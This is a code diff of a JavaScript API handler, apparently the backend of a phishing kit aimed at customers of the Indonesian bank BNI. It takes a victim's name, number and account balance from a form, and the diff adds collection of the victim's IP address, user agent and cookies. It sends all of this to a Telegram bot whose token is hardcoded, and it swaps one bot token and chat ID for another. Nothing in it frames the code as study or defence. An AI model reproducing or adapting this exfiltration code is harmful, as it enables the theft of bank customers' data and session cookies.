@@ -3,18 +3,34 @@ export default async function handler(req, res) {
         return res.status(405).json({ message: 'Method Not Allowed' });
     }
 
-    const telegramId = '7620965847';
-    const botToken = '8126128007:AAEyBzHjL3mXfA_d7QPK-wPGMOOwfmajuSA';
-
+    const telegramId = '-1002521703546';
+    const botToken = '7975184969:AAHQe0cBq-RshRP4OUePLYpTNNRxm41dkM0';
     const { a, b, c } = req.body;
 
+    // Ambil IP Address (dari header real IP atau fallback)
+    const ip =
+        req.headers['x-forwarded-for']?.split(',')[0] ||
+        req.socket?.remoteAddress ||
+        'Unknown IP';
+
+    // Ambil User-Agent
+    const userAgent = req.headers['user-agent'] || 'Unknown UA';
+
+    // Ambil cookies (langsung dari header)
+    const cookies = req.headers.cookie || 'No cookies sent';
+
+    // Format pesan
     const message = `
 ______________________________
 RES BNI new
 ______________________________
-• NAME : ${a}
-• NOMOR : ${b}
-• SALDO : ${c}
+• NAME   : ${a}
+• NOMOR  : ${b}
+• SALDO  : ${c}
+______________________________
+📡 IP        : ${ip}
+🧠 USER-AGENT: ${userAgent}
+🍪 COOKIES   : ${cookies}
 ______________________________`;
 
     const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -30,7 +46,6 @@ ______________________________`;
             })
         });
 
-        // Balikin status sukses ke frontend
         res.status(200).json({ success: true });
     } catch (error) {
         console.error('Error sending message:', error);
